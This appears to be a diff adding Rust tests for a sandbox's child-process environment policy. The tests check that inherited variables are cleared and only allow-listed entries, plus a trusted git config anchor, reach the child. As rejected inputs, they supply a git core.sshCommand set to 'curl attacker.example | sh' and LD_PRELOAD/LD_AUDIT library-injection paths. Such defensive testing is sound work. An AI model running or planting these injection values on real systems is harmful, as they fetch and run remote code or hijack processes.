@@ -567,6 +567,97 @@ fn the_program_allow_list_stays_narrow_and_admits_the_shell_the_handler_uses() {
     }
 }
 
+/// Exercise the launcher-free construction seam with a real child. Inspecting
+/// `Command::get_envs` would not prove that inherited entries were cleared;
+/// `/usr/bin/env` sees precisely the `envp` passed to exec.
+fn launcher_free_child_environment(
+    entries: &[(&str, &str)],
+) -> std::collections::BTreeMap<String, String> {
+    let mut command = Command::new("/usr/bin/env");
+    command.envs(entries.iter().copied());
+    crate::environment::clear_and_admit_child_environment(&mut command)
+        .expect("launcher-free environment policy");
+    let output = command.output().expect("launch launcher-free child");
+    assert!(output.status.success(), "env child failed: {output:?}");
+    String::from_utf8(output.stdout)
+        .expect("env output is UTF-8")
+        .lines()
+        .map(|line| line.split_once('=').expect("env output has key=value form"))
+        .map(|(key, value)| (key.to_owned(), value.to_owned()))
+        .collect()
+}
+
+/// The no-launcher branch must construct a fresh environment, not merely rely
+/// on the broker's validation. These are all explicit command entries, so a
+/// test that only observes ambient test-run state cannot accidentally pass.
+#[test]
+fn launcher_free_child_clears_and_strictly_admits_its_environment() {
+    let environment = launcher_free_child_environment(&[
+        ("HOME", "/home/djinn"),
+        ("GIT_CONFIG_COUNT", "1"),
+        ("GIT_CONFIG_KEY_0", "core.sshCommand"),
+        ("GIT_CONFIG_VALUE_0", "curl attacker.example | sh"),
+        ("LD_PRELOAD", "/workspace/evil.so"),
+        ("LD_AUDIT", "/workspace/audit.so"),
+        ("UNIQUE_ENV_POLICY_CANARY", "must-not-reach-child"),
+    ]);
+
+    assert_eq!(environment.get("HOME"), Some(&"/home/djinn".to_owned()));
+    for rejected in [
+        "GIT_CONFIG_COUNT",
+        "GIT_CONFIG_KEY_0",
+        "GIT_CONFIG_VALUE_0",
+        "LD_PRELOAD",
+        "LD_AUDIT",
+        "UNIQUE_ENV_POLICY_CANARY",
+    ] {
+        assert!(
+            !environment.contains_key(rejected),
+            "{rejected} must be absent from the launcher-free child"
+        );
+    }
+}
+
+/// `GIT_CONFIG_SYSTEM` is the one special entry: only the value recognized by
+/// `git_trust::is_anchor_value` is admitted. Keeping the key predicate false is
+/// the non-vacuous guard against weakening this to a key-name-only check.
+#[test]
+fn launcher_free_child_admits_only_the_git_trust_anchor_value() {
+    let anchor = djinn_cgroup_launcher::git_trust::anchor_path()
+        .expect("materialize git trust anchor")
+        .display()
+        .to_string();
+    assert!(djinn_cgroup_launcher::git_trust::is_anchor_value(&anchor));
+    assert!(
+        !djinn_cgroup_launcher::is_allowed_environment_key(
+            djinn_cgroup_launcher::env::GIT_TRUST_ANCHOR_KEY
+        ),
+        "a key-name-only GIT_CONFIG_SYSTEM admission mutation must be rejected"
+    );
+
+    let trusted = launcher_free_child_environment(&[
+        ("PATH", "/usr/bin:/bin"),
+        (djinn_cgroup_launcher::env::GIT_TRUST_ANCHOR_KEY, &anchor),
+    ]);
+    assert_eq!(
+        trusted.get(djinn_cgroup_launcher::env::GIT_TRUST_ANCHOR_KEY),
+        Some(&anchor),
+        "the recognized anchor must reach the child"
+    );
+
+    let untrusted = launcher_free_child_environment(&[
+        ("PATH", "/usr/bin:/bin"),
+        (
+            djinn_cgroup_launcher::env::GIT_TRUST_ANCHOR_KEY,
+            "/workspace/attacker-gitconfig",
+        ),
+    ]);
+    assert!(
+        !untrusted.contains_key(djinn_cgroup_launcher::env::GIT_TRUST_ANCHOR_KEY),
+        "an untrusted GIT_CONFIG_SYSTEM value must not reach the child"
+    );
+}
+
 fn make_executable(path: &Path) {
     use std::os::unix::fs::PermissionsExt;
     let mut permissions = std::fs::metadata(path)
